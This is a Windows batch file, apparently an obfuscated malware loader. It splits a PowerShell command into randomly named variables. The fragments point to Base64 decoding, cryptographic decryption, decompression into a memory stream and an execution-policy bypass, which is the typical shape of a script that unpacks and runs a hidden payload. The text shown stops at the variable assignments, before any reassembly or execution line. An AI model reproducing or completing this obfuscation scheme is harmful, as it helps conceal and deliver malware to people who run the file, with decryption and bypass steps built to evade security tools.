@echo off
set "dJhaByqpht=.Sec"
set "TFYkikJyJg=brea"
set "rMQQiJJNWC=vj0m"
set "IGvuKuloWF=)($c"
set "RBCMoRtgGN=rity"
set "xMtGRXzQHf=$YXu"
set "ZIiYoLedtB=ert]"
set "PBdVZENGIk=ptog"
set "zIKqFhbugx=RuiG"
set "JoyZJFwpSk=RuiG"
set "xdzOHdOWLw=xRui"
set "vzCSaLSnNH=ress"
set "OvwJgNsFPN=);$x"
set "CNrIsyXguz=gMod"
set "VZUoceWbQK=.IO."
set "AZUXXFjNUx=ards"
set "ToXErDzccC=$Vfg"
set "qShBpfTqGF=tem."
set "xHxRbnyzRG= = $"
set "GsaMiDOkVa=();$"
set "VpWTyFTsHH=Secu"
set "pJzyICMkpG=y.Cr"
set "WfFBUdxkmp=);$x"
set "afTXvjXHnm=zz);"
set "GkssKzNcFm=$HPT"
set "VQQIYpdvAu=-joi"
set "cJLsVqZrfs=rdsv"
set "nQOgrSfDWo=[IO."
set "XtYdCsuqcC=T.En"
set "IRHCmFJtYe=zz.T"
set "jSRNKSjbcF===')"
set "NxuDhGFeXg=);$Z"
set "uzWhaAJudP=esaB"
set "SWAMZCrrNu=ptog"
set "FgkbYQnlCX=fore"
set "NgANkUjifh=joMJ"
set "fEsGoHusoO=.Mod"
set "XyzOJcNkQj=Comp"
set "gpwxPEzzvZ=raph"
set "vZiSpDLnJj=  $c"
set "jeQBXyVlmj=6esa"
set "rwuQqoSNfD=3HWs"
set "nmvnjHQVex=ecry"
set "bhJKWORlOQ=ukr."
set "EEZtyXWyHf=oin "
set "OtDkdcZTVL=.Cry"
set "lDfghjjnVT=ose("
set "tRaGJCaPbA=]::("
set "QOHQEBscJA=$lAX"
set "jZtaqRXoUJ=eam("
set "ZgLcWMEIml=n ''"
set "fJJEnSLbyj=('da"
set "sytmxZOGsU=sv ="
set "VhEVTmxNps=-ep "
set "mNfedlXlwh=ress"
set "EDqVKIovmP=pose"
set "cgxGxCRyKS=:: '"
set "LjSJjUOlcH=ards"
set "BHNpQDhLgd=k; }"
set "dyQGxgwaBo=);$I"
set "lXcxNMDvNC=stem"
set "LrqQCqDfnl=daeR"
set "RAcvTwyhzT=[-1."
set "XVOxbIbzBQ=comm"
set "FtpwDbeevS=736u"
set "yZTABMvisa=saBm"
set "SKeLRaEdwI=v = "
set "eMyLEBENIR=ring"
set "oAVuhaWPjc=$ard"
set "gXYbUgDlCo=);$V"
set "mxJqGuwljt=ZYYc"
set "MSJmcEhmdo=XbAN"
set "FXVgdrNiTK=MJT "
set "hOFwkgrxlA=sion"
set "nnIyvnPzPE='')("
set "FkxaYTimNF=sGUc"
set "dOeFGWBceI=form"
set "buZlJUZQPk=.Mem"
set "DXPEGCXEqc=] -j"
